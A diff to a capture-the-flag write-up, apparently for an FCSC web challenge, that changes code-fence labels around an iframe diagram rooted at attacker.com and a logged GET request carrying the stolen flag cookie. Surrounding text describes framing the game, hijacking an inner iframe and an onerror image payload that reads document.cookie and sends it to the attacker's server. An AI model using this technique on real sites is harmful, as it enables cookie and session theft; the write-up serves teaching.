@@ -104,7 +104,7 @@ The check verifies that the message comes from the `aquariumFrame` window object
 
 Since the game page is framable, we load it inside an iframe on our attacker page. That outer iframe contains its own `<iframe id="aquariumFrame" src="/aquarium"></iframe>`, the inner frame we want to hijack.
 
-```jsx
+```text
   attacker.com (top)
   └── iframe → 10-fast-fishers-app:5000/ (game.js)
       └── iframe#aquariumFrame → /aquarium (aquarium.js)
@@ -218,8 +218,8 @@ iframe.onload = () => {
 
 The `<img>` tag is injected into the `contenteditable` editor via `insertHTML`. Its `onerror` handler fires immediately, reading `document.cookie` and exfiltrating the flag to the attacker's server.
 
-```html
-GET /?c=FLAG=FCSC{ef387c83c9e558b135d9837c5dc43f46}
+```http
+GET /?c=FLAG=FCSC{ef387c83c9e558b135d9837c5dc43f46} HTTP/1.1
 ```
 
 # Conclusion
